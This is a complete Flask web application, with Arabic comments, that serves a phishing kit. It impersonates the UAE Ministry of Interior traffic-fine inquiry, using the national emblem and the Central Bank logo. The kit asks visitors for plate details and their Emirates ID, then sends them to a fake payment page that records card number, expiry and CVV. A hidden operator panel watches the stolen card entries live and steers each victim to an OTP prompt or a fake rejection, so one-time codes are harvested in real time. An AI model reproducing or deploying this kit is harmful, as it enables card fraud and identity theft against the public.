import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات التحكم
db = {"logs": [], "status": "waiting"}

# الهيدر الثابت (تعديلك المعتمد)
HEADER = '<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;"></div>'

# --- 1. الصفحة الرئيسية (الـ 8 صور كاملة) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html {{ margin:0; padding:0; background:#f4f4f4; font-family: sans-serif; }}
    .page {{ max-width:650px; margin:0 auto; background:white; position:relative; }}
    img {{ width:100%; display:block; }}
    .btn-hidden {{ position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }}
</style>
</head>
<body>
    {HEADER}
    <div class="page">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <button class="btn-hidden" style="top:270px;" onclick="location.href='/search'"></button>
        <button class="btn-hidden" style="top:325px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (نسخة وزارة الداخلية MOI طبق الأصل) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#f7f8fa; margin:0; font-family: 'Segoe UI', Arial, sans-serif; }}
    .moi-card {{ background:white; width:92%; max-width:850px; margin:40px auto; border-radius:8px; box-shadow:0 5px 20px rgba(0,0,0,0.05); overflow:hidden; }}
    .moi-title {{ background:#23395d; color:white; padding:20px 30px; font-size:20px; font-weight:bold; display:flex; justify-content:space-between; align-items:center; }}
    .moi-body {{ padding:40px; }}
    .tabs-row {{ display:flex; border-bottom:1px solid #eee; margin-bottom:30px; gap:20px; }}
    .tab-item {{ padding:12px 5px; cursor:pointer; color:#777; font-weight:600; border-bottom:4px solid transparent; font-size:15px; }}
    .tab-item.active {{ color:#b0914f; border-bottom-color:#b0914f; }}
    label {{ display:block; margin-bottom:10px; font-size:14px; color:#333; font-weight:bold; }}
    select, input {{ width:100%; padding:14px; margin-bottom:20px; border:1px solid #e1e1e1; border-radius:4px; font-size:15px; box-sizing:border-box; background:#fdfdfd; }}
    .grid-moi {{ display:grid; grid-template-columns: 1fr 0.6fr 2fr; gap:15px; }}
    .btn-search-moi {{ background:#b0914f; color:white; padding:15px 45px; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; float:left; transition:0.3s; }}
    .btn-search-moi:hover {{ background:#8e753f; }}
</style></head>
<body>
    {HEADER}
    <div class="moi-card">
        <div class="moi-title">
            <span>الاستعلام عن المخالفات المرورية</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" height="40">
        </div>
        <div class="moi-body">
            <div class="tabs-row">
                <div class="tab-item active">بيانات اللوحة</div>
                <div class="tab-item">الرمز المروري</div>
                <div class="tab-item">بيانات الرخصة</div>
            </div>
            <form action="/checkout" method="GET">
                <label>إمارة مصدر اللوحة / Plate Source</label>
                <select>
                    <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                    <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option>
                    <option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
                </select>
                <div class="grid-moi">
                    <div><label>نوع اللوحة</label><select><option>خصوصي</option><option>نقل عام</option><option>تجاري</option></select></div>
                    <div><label>الرمز</label><input type="text" placeholder="1"></div>
                    <div><label>رقم اللوحة</label><input type="text" placeholder="12345"></div>
                </div>
                <label>رقم الهوية الإماراتية / Emirates ID</label>
                <input type="text" placeholder="784-XXXX-XXXXXXX-X" required>
                <div style="overflow:hidden; margin-top:10px;">
                    <button type="submit" class="btn-search-moi">استعلام / Search</button>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
"""

# --- 3. بوابة الدفع (النسخة الفخمة المعتمدة) ---
PAY_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#eaebed; margin:0; font-family: 'Segoe UI', Tahoma; }}
    .pay-card {{ max-width:500px; margin:40px auto; background:white; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.1); border:1px solid #ddd; overflow:hidden; }}
    .pay-head {{ background:white; padding:20px; text-align:center; border-bottom:1px solid #eee; }}
    .pay-body {{ padding:30px; }}
    .amt {{ background:#f8f9fa; border:1px dashed #b0914f; padding:15px; text-align:center; border-radius:8px; margin-bottom:25px; }}
    input {{ width:100%; padding:15px; margin-bottom:20px; border:1px solid #ccc; border-radius:6px; font-size:16px; box-sizing:border-box; }}
    .btn-p {{ background:#2c3e50; color:white; width:100%; padding:18px; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; }}
</style></head>
<body>
    {HEADER}
    <div class="pay-card">
        <div class="pay-head"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png" height="50"></div>
        <div class="pay-body">
            <div class="amt">المبلغ المستحق: <strong style="font-size:22px;">255.00 AED</strong></div>
            <form action="/submit-card" method="POST">
                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
                <input type="text" id="cn" name="card" placeholder="رقم البطاقة" maxlength="19" required>
                <div style="display:flex; gap:10px;"><input type="text" name="exp" placeholder="MM/YY"><input type="text" name="cvv" placeholder="CVV"></div>
                <button type="submit" class="btn-p">دفع الآن</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('cn').addEventListener('input', e => {{
            let v = e.target.value.replace(/\\s/g, '').replace(/(.{{4}})/g, '$1 ').trim();
            e.target.value = v;
        }});
    </script>
</body>
</html>
"""

# باقي مسارات السيرفر (h-admin, submit, etc.) بنفس تعديلاتك السابقة...
@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/h-admin')
def admin():
    return render_template_string("""<body style="background:#111; color:white; padding:20px;"><h2>لوحة التحكم 👮‍♂️</h2><div id="logs"></div><script>function load(){fetch('/get-logs').then(r=>r.json()).then(data=>{let h='';data.logs.forEach(l=>{h+=`<div style="border:1px solid gold; padding:15px; margin-bottom:10px;">${JSON.stringify(l)}<br><button onclick="act('go_otp')" style="background:green; color:white;">طلب OTP</button><button onclick="act('error_card')" style="background:red; color:white;">رفض</button></div>`;});document.getElementById('logs').innerHTML=h;});}function act(s){fetch('/set-status/'+s);}setInterval(load,3000);</script></body>""")

@app.route('/submit-card', methods=['POST'])
def sub():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status']})

WAIT_JS = """<script>setInterval(()=>{fetch('/check-status').then(r=>r.json()).then(d=>{if(d.status==='go_otp')location.href='/otp';if(d.status==='error_card'){alert('مرفوض');location.href='/checkout';}});},3000);</script><body style="text-align:center; padding-top:100px;"><h2>جاري التحقق...</h2></body>"""

@app.route('/otp')
def otp(): return "<body><div style='text-align:center; padding:50px;'><h2>OTP</h2><form action='/submit-card' method='POST'><input name='otp'><button>تأكيد</button></form></div></body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
